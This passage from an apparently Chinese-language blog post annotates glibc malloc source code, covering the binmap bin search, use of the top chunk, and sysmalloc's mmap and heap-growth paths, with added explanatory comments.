class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs C">++idx;<br>bin = bin_at (av, idx);<br>block = idx2block (idx);<br><span class="hljs-built_in">map</span> = av-&gt;binmap[block];<br>bit = idx2bit (idx);<br><br><span class="hljs-keyword">for</span> (;; )<br>  &#123;<br>        <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>        <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>          &#123;<br>            <span class="hljs-keyword">do</span><br>              &#123;<br>                <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                  <span class="hljs-keyword">goto</span> use_top;<br>              &#125;<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>            bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>            bit = <span class="hljs-number">1</span>;<br>          &#125;<br><br>        <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>        <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>          &#123;<br>            bin = next_bin (bin);<br>            bit &lt;&lt;= <span class="hljs-number">1</span>;<br>            assert (bit != <span class="hljs-number">0</span>);<br>          &#125;<br><br>        <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>        victim = last (bin);<br><br>        <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>        <span class="hljs-comment">//下面这种误报情况是有可能将bit置为0的，这种情况是bit已经到31位了，31位误报，bit&lt;&lt;1就会溢出变为0【这里31是指2^31】</span><br>        <span class="hljs-keyword">if</span> (victim == bin)<br>          &#123;<br>            av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><span class="hljs-comment">//清除该位</span><br>            bin = next_bin (bin);<span class="hljs-comment">//下一个bin，有可能一个block有多个bin可用</span><br>            bit &lt;&lt;= <span class="hljs-number">1</span>;<br>          &#125;<br><br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            size = chunksize (victim);<br><br>            <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>            assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br><br>            remainder_size = size - nb;<br><br>            <span class="hljs-comment">/* unlink */</span><br>            unlink (av, victim, bck, fwd);<br><br>            <span class="hljs-comment">/* Exhaust */</span><br>            <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>              &#123;<br>                set_inuse_bit_at_offset (victim, size);<br>                <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                  victim-&gt;size |= NON_MAIN_ARENA;<br>              &#125;<br><br>            <span class="hljs-comment">/* Split */</span><br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                remainder = chunk_at_offset (victim, nb);<br><br>                <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                  have to perform a complete insert here.  */</span><br>                bck = unsorted_chunks (av);<br>                fwd = bck-&gt;fd;<br>                <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                &#123;<br>                    errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                    <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>                remainder-&gt;bk = bck;<br>                remainder-&gt;fd = fwd;<br>                bck-&gt;fd = remainder;<br>                fwd-&gt;bk = remainder;<br><br>                <span class="hljs-comment">/* advertise as last remainder */</span><br>                <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                  av-&gt;last_remainder = remainder;<br>                <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                  &#123;<br>                    remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                    remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                  &#125;<br>                set_head (victim, nb | PREV_INUSE |<br>                          (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                set_head (remainder, remainder_size | PREV_INUSE);<br>                set_foot (remainder, remainder_size);<br>              &#125;<br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h5 id="usetop"><a href="#usetop" class="headerlink" title="usetop"></a>usetop</h5><p>下面就是尝试使用top chunk了，</p><p>如果top能够进行分配，那么就会直接分配；</p><p>如果top空间不足会触发一次合并fast chunk操作，然后从头再进行尝试分配一次；</p><p>如果top空间不足且无fast chunk可合并，就只能尝试向系统进行申请了</p><p>这部分值得提出的是，if ((unsigned long) (size) &gt;&#x3D; (unsigned long) (nb + MINSIZE))，为什么要限制top chunk至少能保留MINSIZE呢？因为这个MINSIZE用来标记前面的chunk的使用状态，仅此而已。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs C">use_top:<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">     less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">     be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">     limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">     MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">     exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">     reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">     to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">   */</span><br><br>  victim = av-&gt;top;<br>  size = chunksize (victim);<br>  <span class="hljs-comment">//top chunk能直接分配所需的大小，这里要始终让top chunk至少能剩MINSIZE，为了标记前面的chunk</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>    &#123;<br>      remainder_size = size - nb;<br>      remainder = chunk_at_offset (victim, nb);<br>      av-&gt;top = remainder;<br>      set_head (victim, nb | PREV_INUSE |<br>                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>      set_head (remainder, remainder_size | PREV_INUSE);<br><br>      check_malloced_chunk (av, victim, nb);<br>      <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>      alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br>  <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">     here for all block sizes.  */</span><br>  <span class="hljs-comment">//如果top chunk空间不足，就会触发尝试合并fast chunk，然后从头再来一次</span><br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>    &#123;<br>      malloc_consolidate (av);<br>      <span class="hljs-comment">/* restore original bin index */</span><br>      <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>        idx = smallbin_index (nb);<br>      <span class="hljs-keyword">else</span><br>        idx = largebin_index (nb);<br>    &#125;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-comment">//如果也没有fast chunk可以进行合并，那么就会尝试向系统申请</span><br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>        alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h4><h5 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h5><p>下面判断是否达到使用mmap分配的条件：1.av为空时；2.申请的大小能达到mmap的门槛</p><p>这里主要提几个注意点：</p><p>1.在调用mmap之前，ALIGN_UP (nb + SIZE_SZ：加个SIZE_SZ是因为正常的chunk是有相邻的chunk的，而且有一个共用部分pre_size字段。所以在使用mmap分配时，需要提前将这部分加上</p><p>2.通过mmap分配后，有可能会进行内存没对齐，又通过front_misalign来进行记录，最后将返回的地址向下移动差值即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs C">mchunkptr old_top;              <span class="hljs-comment">/* incoming value of av-&gt;top */</span><br>INTERNAL_SIZE_T old_size;       <span class="hljs-comment">/* its size */</span><br><span class="hljs-type">char</span> *old_end;                  <span class="hljs-comment">/* its end address */</span><br><br><span class="hljs-type">long</span> size;                      <span class="hljs-comment">/* arg to first MORECORE or mmap call */</span><br><span class="hljs-type">char</span> *brk;                      <span class="hljs-comment">/* return value from MORECORE */</span><br><br><span class="hljs-type">long</span> correction;                <span class="hljs-comment">/* arg to 2nd MORECORE call */</span><br><span class="hljs-type">char</span> *snd_brk;                  <span class="hljs-comment">/* 2nd return val */</span><br><br>INTERNAL_SIZE_T front_misalign; <span class="hljs-comment">/* unusable bytes at front of new space */</span><br>INTERNAL_SIZE_T end_misalign;   <span class="hljs-comment">/* partial page left at end of new space */</span><br><span class="hljs-type">char</span> *aligned_brk;              <span class="hljs-comment">/* aligned offset into brk */</span><br><br>mchunkptr p;                    <span class="hljs-comment">/* the allocated/returned chunk */</span><br>mchunkptr remainder;            <span class="hljs-comment">/* remainder from allocation */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;   <span class="hljs-comment">/* its size */</span><br><br><br><span class="hljs-type">size_t</span> pagesize = GLRO (dl_pagesize);<br><span class="hljs-type">bool</span> tried_mmap = <span class="hljs-literal">false</span>;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If have mmap, and the request size meets the mmap threshold, and</span><br><span class="hljs-comment">  the system supports mmap, and there are few enough currently</span><br><span class="hljs-comment">  allocated mmapped regions, try to directly map this request</span><br><span class="hljs-comment">  rather than expanding top.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//主要是两种情况下会选择使用mmap：1.av为空；2.申请的大小已经达到使用mmap的门槛了</span><br><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>    || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)<br>  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<br>  &#123;<br>        <span class="hljs-type">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br><br>      try_mmap:<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Round up size to nearest page.  For mmapped chunks, the overhead</span><br><span class="hljs-comment">          is one SIZE_SZ unit larger than for normal chunks, because there</span><br><span class="hljs-comment">          is no following chunk whose prev_size field could be used.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          See the front_misalign handling below, for glibc there is no</span><br><span class="hljs-comment">          need for further alignments unless we have have high alignment.</span><br><span class="hljs-comment">        */</span><br>       <span class="hljs-comment">//下面多一个size，是因为对于mapped chunk没有相邻的下一个chunk头部presize字段可用</span><br>        <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>          size = ALIGN_UP (nb + SIZE_SZ, pagesize);<br>        <span class="hljs-keyword">else</span><br>          size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);<br>        tried_mmap = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>          &#123;<br>            mm = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br><br>            <span class="hljs-keyword">if</span> (mm != MAP_FAILED)<br>              &#123;<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                  The offset to the start of the mmapped region is stored</span><br><span class="hljs-comment">                  in the prev_size field of the chunk. This allows us to adjust</span><br><span class="hljs-comment">                  returned start address to meet alignment requirements here</span><br><span class="hljs-comment">                  and in memalign(), and still be able to compute proper</span><br><span class="hljs-comment">                  address argument for later munmap in free() and realloc().</span><br><span class="hljs-comment">                */</span><br>                <span class="hljs-comment">//下面这个是申请后，检查是否有没对齐的内存部分，用frot_misalign来记录</span><br>                <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>                  &#123;<br>                    <span class="hljs-comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span><br><span class="hljs-comment">                      MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#x27;ed area is page</span><br><span class="hljs-comment">                      aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span><br>                    assert (((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                    front_misalign = <span class="hljs-number">0</span>;<br>                  &#125;<br>                <span class="hljs-keyword">else</span><br>                  front_misalign = (INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;<br>                <br>                <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)<br>                  &#123;<br>                    <span class="hljs-comment">//correction记录还差多少能对齐，这里选择将申请来的地址向下移动差的字节进行对齐</span><br>                    correction = MALLOC_ALIGNMENT - front_misalign;<br>                    p = (mchunkptr) (mm + correction);<br>                    p-&gt;prev_size = correction;<br>                    set_head (p, (size - correction) | IS_MMAPPED);<br>                  &#125;<br>                <span class="hljs-keyword">else</span><br>                  &#123;<br>                    p = (mchunkptr) mm;<br>                    set_head (p, size | IS_MMAPPED);<br>                  &#125;<br><br>                <span class="hljs-comment">/* update statistics */</span><br>                <span class="hljs-comment">//下面这个部分就是更新mmap分配的数量，还有mmap分配的内存大小</span><br>                <span class="hljs-type">int</span> new = atomic_exchange_and_add (&amp;mp_.n_mmaps, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>                <span class="hljs-type">atomic_max</span> (&amp;mp_.max_n_mmaps, new);<br><br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum;<br>                sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;<br>                <span class="hljs-type">atomic_max</span> (&amp;mp_.max_mmapped_mem, sum);<br><br>                check_chunk (av, p);<br><br>                <span class="hljs-keyword">return</span> chunk2mem (p);<br>              &#125;<br>          &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h5 id="一些中间操作"><a href="#一些中间操作" class="headerlink" title="一些中间操作"></a>一些中间操作</h5><p>主要是一些获取操作和一些判断条件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* There are no usable arenas and mmap also failed.  */</span><br><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* Record incoming configuration of top */</span><br><br>old_top = av-&gt;top;<br>old_size = chunksize (old_top);<br>old_end = (<span class="hljs-type">char</span> *) (chunk_at_offset (old_top, old_size));<br><br>brk = snd_brk = (<span class="hljs-type">char</span> *) (MORECORE_FAILURE);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If not the first time through, we require old_size to be</span><br><span class="hljs-comment">  at least MINSIZE and to have prev_inuse set.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//这里就是两个条件，一个是没有初始化时，将unsorted当作假top，此时top_chunk size为0；</span><br><span class="hljs-comment">//正常后，要保证top chunk至少有MINSIZE并且前面的chunk在使用</span><br>assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>        prev_inuse (old_top) &amp;&amp;<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br><br><span class="hljs-comment">/* Precondition: not enough current space to satisfy nb request */</span><br>assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE));<br></code></pre></td></tr></table></figure><h5 id="非主分配区分配"><a href="#非主分配区分配" class="headerlink" title="非主分配区分配"></a>非主分配区分配</h5><p>注意点：下面根据top chunk指针计算其heap头的地址，是因为heap本身是页对齐的，所以可以直接通过逻辑运算进行求得。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">heap_for_ptr</span>(ptr) <br>((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - <span class="hljs-number">1</span>)))<br></code></pre></td></tr></table></figure><p>下面是if-else分支的if分支，这个主要是用来处理非主分配区的分配</p><p>先看下大致流程：</p><p>首先就是尝试增长原heap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>  &#123;<br>    <span class="hljs-comment">//非主分配区</span><br>    heap_info *old_heap, *heap;<br>    <span class="hljs-type">size_t</span> old_heap_size;<br><br>    <span class="hljs-comment">/* First try to extend the current heap. */</span><br>    old_heap = heap_for_ptr (old_top);<br>    old_heap_size = old_heap-&gt;size;<br>    <span class="hljs-comment">//如果heap空间不足，尝试增长heap</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="hljs-number">0</span><br>        &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="hljs-number">0</span>)<br>      &#123;<br>        av-&gt;system_mem += old_heap-&gt;size - old_heap_size;<br>        arena_mem += old_heap-&gt;size - old_heap_size;<br>        set_head (old_top, (((<span class="hljs-type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="hljs-type">char</span> *) old_top)<br>                  | PREV_INUSE);<br>      &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="hljs-keyword">sizeof</span> (*heap)), mp_.top_pad)))<br>      &#123;<br>        <span class="hljs-comment">//这里是使用新创建的一个heap</span><br>        <span class="hljs-comment">/* Use a newly allocated heap.  */</span><br>        heap-&gt;ar_ptr = av;<br>        heap-&gt;prev = old_heap;<br>        av-&gt;system_mem += heap-&gt;size;<br>        arena_mem += heap-&gt;size;<br>        <span class="hljs-comment">/* Set up the new top.  */</span><br>        <span class="hljs-comment">//新申请的堆的结构：</span><br>        <span class="hljs-comment">//heap：struct heap...| top chunk...</span><br>        top (av) = chunk_at_offset (heap, <span class="hljs-keyword">sizeof</span> (*heap));<br>        set_head (top (av), (heap-&gt;size - <span class="hljs-keyword">sizeof</span> (*heap)) | PREV_INUSE);<br><br>        <span class="hljs-comment">/* Setup fencepost and free the old top chunk with a multiple of</span><br><span class="hljs-comment">          MALLOC_ALIGNMENT in size. */</span><br>        <span class="hljs-comment">/* The fencepost takes at least MINSIZE bytes, because it might</span><br><span class="hljs-comment">          become the top chunk again later.  Note that a footer is set</span><br><span class="hljs-comment">          up, too, although the chunk is marked in use. */</span><br>        old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;<br>        set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ), <span class="hljs-number">0</span> | PREV_INUSE);<br>        <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>          &#123;<br>            set_head (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>            set_foot (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ));<br>            set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);<br>            _int_free (av, old_top, <span class="hljs-number">1</span>);<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            set_head (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>            set_foot (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ));<br>          &#125;<br>      &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!tried_mmap)<br>      <span class="hljs-comment">/* We can at least try to use to mmap memory.  */</span><br>      <span class="hljs-keyword">goto</span> try_mmap;<br>  &#125;<br></code></pre></td></tr></table></figure><h5 id="主分配区分配"><a href="#主分配区分配" class="headerlink" title="主分配区分配"></a>主分配区分配</h5><h6 id="关于sbrk"><a href="#关于sbrk" class="headerlink" title="关于sbrk"></a>关于sbrk</h6><p>这里插入一个关于sbrk的用法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C">sbrk(<span class="hljs-number">0</span>)返回当前段结束地址#<span class="hljs-number">1</span><br>sbrk(<span class="hljs-number">4096</span>)返回增加后的起始地址#<span class="hljs-number">2</span><br>sbrk(<span class="hljs-number">0</span>)返回当前段结束地址#<span 